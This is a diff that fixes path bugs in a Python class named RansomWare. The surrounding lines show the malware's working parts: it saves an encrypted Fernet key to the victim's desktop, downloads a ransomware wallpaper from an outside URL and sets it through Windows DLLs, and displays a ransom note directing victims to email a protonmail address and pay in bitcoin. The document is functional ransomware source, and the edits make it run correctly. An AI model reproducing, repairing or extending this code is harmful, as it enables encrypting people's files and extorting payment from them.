@@ -82,7 +82,7 @@ class RansomWare:
             # Write encrypted fernet key to file
             f.write(enc_fernent_key)
         # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
-        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:
+        with open(f'{self.sysRoot}/Desktop/EMAIL_ME.txt', 'wb') as fa:
             fa.write(enc_fernent_key)
         # Assign self.key to encrypted fernet key
         self.key = enc_fernent_key
@@ -138,7 +138,7 @@ class RansomWare:
     def change_desktop_background(self):
         imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
         # Go to specif url and download+save image using absolute path
-        path = f'{self.sysRoot}Desktop/background.jpg'
+        path = f'{self.sysRoot}/Desktop/background.jpg'
         urllib.request.urlretrieve(imageUrl, path)
         SPI_SETDESKWALLPAPER = 20
         # Access windows dlls for funcionality eg, changing dekstop wallpaper
@@ -155,7 +155,7 @@ Only we can decrypt your files!
 
 To purchase your key and restore your data, please follow these three easy steps:
 
-1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com
+1. Email the file called EMAIL_ME.txt at {self.sysRoot}/Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com
 
 2. You will recieve your personal BTC address for payment.
    Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
